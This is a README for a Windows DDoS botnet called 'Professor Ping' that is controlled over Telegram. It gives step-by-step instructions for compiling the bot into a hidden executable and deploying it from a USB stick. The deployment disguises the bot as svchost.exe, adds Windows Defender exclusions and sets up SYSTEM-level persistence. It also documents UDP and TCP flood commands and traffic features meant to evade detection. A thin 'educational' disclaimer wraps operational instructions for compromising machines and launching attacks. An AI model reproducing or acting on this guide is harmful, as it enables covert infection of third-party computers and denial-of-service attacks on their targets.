# 🧑‍🏫 Professor Ping - DDoS Botnet / Bot Controller

A high-performance DDoS botnet controller with Telegram-based C&C (Command and Control) capabilities, designed for educational and research purposes.

## ⚠️ DISCLAIMER

This project is intended for **educational and research purposes only**. Unauthorized use for attacking targets without explicit permission is illegal. The developers are not responsible for any misuse or damage caused by this software.

## 🚀 Features

### 🤖 Bot Capabilities
- **Telegram C&C** - Full remote control via Telegram bot
- **Stealth Persistence** - Automatically installs and hides on target systems
- **One File, Many Bots** - Run the same executable on multiple Windows PCs to build a powerful distributed botnet.
- **Real-Time Stats** - Live attack statistics and performance metrics

### ⚡ Attack Methods
- **UDP Flood** - High-performance UDP packet flooding with traffic randomization
- **TCP Flood** - Optimized TCP attacks with realistic HTTP traffic patterns
- **Layer 4 Optimized** - Socket pooling and batch processing for maximum efficiency

### 🔒 Stealth & Persistence
- **File Hiding** - Copies itself to system directories with hidden attributes
- **Antivirus Exclusion** - Automatically adds Windows Defender exclusions
- **Multiple Persistence Methods**:
  
  - Scheduled Tasks (SYSTEM level)
  - Registry Run Keys (fallback)
  - Hidden system process naming

## 📁 Project Structure
```
Professor-Ping/
├── main.pyw                 # Main bot controller application
├── deploy.bat              # Automated deployment script
└── README.md               # Project documentation
```

## 🔧 Installation & Deployment

### Prerequisites
- Windows operating system
- **Administrator privileges** (required for system installation)
- Python 3.7+ (for development)
- Telegram bot token

### Step 1: Get Telegram Bot Token
1. Open Telegram and search for `@BotFather`
2. Send `/newbot` command
3. Follow instructions to create your bot
4. Copy the API token provided by BotFather
5. Replace `BOT_TOKEN` in `main.pyw` with your token:
```
BOT_TOKEN = "YOUR_ACTUAL_BOT_TOKEN_HERE"
```

### Step 2: Get Your Chat ID
1. Send a message to your bot
2. Visit this URL in your browser but replace `YOUR_ACTUAL_CHAT_ID` with your actual token:
   ```https://api.telegram.org/botYOUR_BOT_TOKEN/getUpdates```
4. Look for the `"chat"` object and find the `"id"` field
5. Copy the numeric Chat ID
6. Replace `ADMIN_CHAT_ID` in `main.pyw` with your token:
```
ADMIN_CHAT_ID = YOUR_ACTUAL_CHAT_ID
```

### Step 3: Install Required Dependencies
Open command prompt as administrator and run:
```
pip install python-telegram-bot requests pyinstaller
```

If any module is missing, install it individually:
```
pip install "module name"
pip install telegram
pip install requests
pip install asyncio
```

### Step 4: Compile with Nuitka
Compile the Python script to a standalone executable using Nuitka:
```
nuitka --onefile --follow-imports --windows-disable-console --include-package=telegram --include-package=asyncio main.pyw
```

This will create a single executable file without console window.

### Step 5: File Renaming for Deployment
After compilation, rename the generated executable using a Terminal:
```
ren main.exe system.tmp
```

Create the required folder structure:
```
YourUSB/
├── deploy.bat
└── _Data/
    └── system.tmp  (renamed compiled executable)
```

### Step 6: Automated Deployment
1. Run `deploy.bat` as Administrator
2. The script will:
   - Copy the bot to `%ProgramData%\Microsoft\Network\Diagnostics\svchost.exe`
   - Add Windows Defender exclusion
   - Set hidden and system attributes
   - Create scheduled task for persistence
   - Start the bot service

### Manual Setup Alternative
1. Rename compiled file to `system.tmp`
2. Copy to stealth location manually
3. Configure persistence via Task Scheduler or registry

## 🎮 Bot Commands

### Basic Commands
- `/start` - Register bot with controller
- `/help` - Show command menu
- `/stats` - Display attack statistics
- `/stop` - Stop all active attacks

### Attack Commands
```
/attack [method] [target] [port] [duration] [threads]
```

**Examples:**
- `/attack UDP example.com 80 60 10`
- `/attack TCP 192.168.1.1 443 120 5`

**Available Methods:**
- `UDP` - High-performance UDP flood
- `TCP` - Optimized TCP flood

## ⚙️ Technical Details

### Performance Optimizations
- **Socket Pooling** - Reusable sockets for reduced overhead
- **Batch Processing** - Packet batching for maximum throughput
- **Traffic Randomization** - Realistic traffic patterns to evade detection
- **Multi-threading** - Concurrent attack execution

### Anonymity Features
- Fake IP generation for headers
- Randomized user agents and referers
- Realistic HTTP request patterns
- Traffic distribution simulation

### Statistics Tracking
- Real-time packets per second (PPS)
- Total bandwidth consumption
- Active attack monitoring
- Performance metrics

## 🔒 Security Features

### Stealth Mechanisms
- Console window hiding
- System process naming (svchost.exe)
- File attribute manipulation
- Antivirus exclusion automation

### Persistence Methods
- Scheduled tasks (SYSTEM level)
- Registry run keys
- Hidden file locations
- Automatic restart capabilities

## 📊 Performance Metrics

- **Max Threads**: 50 per attack
- **Packet Size**: 512-1400 bytes (UDP)
- **Batch Size**: 500 packets (UDP), 10 requests (TCP)
- **Connection Reuse**: Socket pooling for efficiency

## 📝 License

This project is for educational purposes only. Use responsibly and only in environments where you have explicit permission to conduct security testing.

## 🔬 Educational Value

This project demonstrates:
- Botnet architecture and C&C communication
- DDoS attack techniques and mitigation
- System persistence methods
- Anti-detection strategies
- Network security principles

**Remember: Always obtain proper authorization before testing any security tools.**
